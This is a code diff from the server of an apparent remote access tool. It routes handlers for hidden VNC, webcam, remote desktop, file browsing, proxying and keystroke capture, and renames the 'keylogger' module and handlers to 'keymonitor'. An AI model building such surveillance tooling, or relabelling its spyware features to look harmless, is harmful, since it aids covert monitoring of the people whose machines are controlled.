@@ -103,13 +103,13 @@ import {
   handleFileBrowserMessage as forwardFileBrowserMessage,
   handleFileBrowserViewerMessage,
   handleFileBrowserViewerOpen,
-  handleKeyloggerMessage,
-  handleKeyloggerViewerMessage,
-  handleKeyloggerViewerOpen,
+  handleKeymonitorMessage,
+  handleKeymonitorViewerMessage,
+  handleKeymonitorViewerOpen,
   handleProcessMessage,
   handleProcessViewerMessage,
   handleProcessViewerOpen,
-} from "./server/ws-file-process-proxy-keylogger";
+} from "./server/ws-file-process-proxy-keymonitor";
 import {
   handleProxyTunnelData,
   handleProxyTunnelClose,
@@ -310,7 +310,7 @@ const notificationPluginHandlers = createNotificationPluginHandlers({
   savePluginState,
 });
 
-type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "notifications_viewer";
+type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keymonitor_viewer" | "notifications_viewer";
 
 type PendingScript = {
   resolve: (result: any) => void;
@@ -493,7 +493,7 @@ async function startServer() {
     handleHVNCViewerOpen,
     handleFileBrowserViewerOpen,
     handleProcessViewerOpen,
-    handleKeyloggerViewerOpen,
+    handleKeymonitorViewerOpen,
     handleVoiceViewerOpen,
     handleDashboardViewerOpen: (ws: import("bun").ServerWebSocket<SocketData>) => {
       const id = crypto.randomUUID();
@@ -513,7 +513,7 @@ async function startServer() {
     handleHVNCViewerMessage,
     handleFileBrowserViewerMessage,
     handleProcessViewerMessage,
-    handleKeyloggerViewerMessage,
+    handleKeymonitorViewerMessage,
     handleVoiceViewerMessage,
     dispatchAutoScriptsForConnection,
     dispatchAutoDeploysForConnection: (info: import("./types").ClientInfo, ws: import("bun").ServerWebSocket<SocketData>) => {
@@ -548,7 +548,7 @@ async function startServer() {
     handleProxyTunnelClose,
     handleProxyConnectResult,
     handleProcessMessage,
-    handleKeyloggerMessage,
+    handleKeymonitorMessage,
     notifyRdInputLatency,
     handleNotificationScreenshotFailure: notificationPluginHandlers.handleNotificationScreenshotFailure,
     handlePluginEvent: notificationPluginHandlers.handlePluginEvent,
